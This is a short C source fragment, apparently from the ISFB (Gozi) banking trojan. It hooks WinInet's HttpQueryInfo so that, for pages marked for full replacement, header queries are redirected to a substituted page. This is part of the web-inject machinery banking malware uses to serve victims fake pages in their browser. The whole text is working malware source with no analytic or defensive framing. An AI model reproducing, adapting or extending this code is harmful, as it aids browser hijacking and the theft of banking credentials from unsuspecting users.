//
//	This function used for full page replace. The idea is to redirect querying any infromation from the source page 
//	 HTTTP headers to the result page HTTP headers.
//
static BOOL HttpQueryInfoCommon(
	HINTERNET	hRequest, 
	DWORD		dwInfoLevel, 
	LPVOID		lpvBuffer, 
	LPDWORD		lpdwBufferLength, 
	LPDWORD		lpdwIndex,
	BOOL		bUnicode
	)
{
	BOOL Ret = FALSE;
	PHANDLE_CONTEXT Ctx;

	if (Ctx = FindHandle(hRequest))
	{
		// Checking if the page will be replaced
		if (Ctx->Flags & CF_REPLACE)
		{
			PTRANSFER_CONTEXT	tCtx = (PTRANSFER_CONTEXT)Ctx->tCtx;

			DbgPrint("ISFB_%04x: HttpQueryInfo replace, dwInfoLevel = %u\n", g_CurrentProcessId, dwInfoLevel);

			// Copmlete loading of the page to replace with
			if ((tCtx) && ((tCtx->Headers) || (TransferCompleteReceive(tCtx, TRUE) == NO_ERROR)))
				// Replacing request handle
				hRequest = tCtx->hRequest;
		}	// if (Ctx->Flags & CF_REPLACE)
		ReleaseHandle(Ctx);
	}	// if (Ctx = FindHandle(hRequest))

	if (bUnicode)
		Ret = HttpQueryInfoW(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex);
	else
		Ret = HttpQueryInfoA(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex);

	return(Ret);
}